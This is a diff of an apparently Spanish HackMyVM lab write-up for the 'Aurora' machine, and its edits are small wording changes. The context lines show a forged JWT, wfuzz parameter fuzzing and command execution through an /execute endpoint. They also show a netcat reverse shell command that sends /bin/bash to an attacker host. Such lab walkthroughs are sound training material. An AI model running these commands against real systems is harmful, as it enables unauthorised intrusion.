@@ -52,7 +52,7 @@
         },
         "datePublished": "2023-05-05",
         "description": "",
-        "wordCount":  1162 ,
+        "wordCount":  1163 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-05-05",
         "image": {
@@ -274,7 +274,7 @@ Identifiants invalides
 <p><img src="/../machines/hmv/aurora/jwtio.webp" alt="jwtio.png"></p>
 <p>Y finalmente cambio <code>your-256-bit-secret</code> por <code>nopassword</code>.
 <img src="/../machines/hmv/aurora/jwtio2.webp" alt="jwtio2.png"></p>
-<p>Enumero <strong>execute</strong> para buscar parámetro value.</p>
+<p>Enumero <strong>execute</strong> para buscar el parámetro value.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c -t 200 --hc=404 --hw=63 -X POST -H &#34;Content-Type:application/json&#34; -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMzAwMTYwfQ.Nk5sSPZpxyvzZrCoWXIAxl3MTUIfQP9sMHlkhA67JG4&#39; -d &#39;{&#34;FUZZ&#34;:&#34;value&#34;}&#39; -w /usr/share/seclists/Discovery/Web-Content/common.txt &#34;http://192.168.1.14:3000/execute&#34;
 </span></span><span style="display:flex;"><span>********************************************************
 </span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -292,7 +292,7 @@ Identifiants invalides
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -X POST http://192.168.1.14:3000/execute -H &#34;Content-Type: application/json&#34; -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMzAwMTYwfQ.Nk5sSPZpxyvzZrCoWXIAxl3MTUIfQP9sMHlkhA67JG4&#39; -d &#39;{&#34;command&#34;:&#34;id&#34;}&#39;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</span></span></code></pre></div><p>Como tengo ejecución de comandos me lanzo una shell.</p>
+</span></span></code></pre></div><p>Como tengo ejecución de comandos me mando una shell.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -X POST http://192.168.1.14:3000/execute -H &#34;Content-Type: application/json&#34; -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMzAwMTYwfQ.Nk5sSPZpxyvzZrCoWXIAxl3MTUIfQP9sMHlkhA67JG4&#39; -d &#39;{&#34;command&#34;:&#34;nc -e /bin/bash 192.168.1.18 1337&#34;}&#39;
 </span></span></code></pre></div><p>Obtengo la shell.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 1337
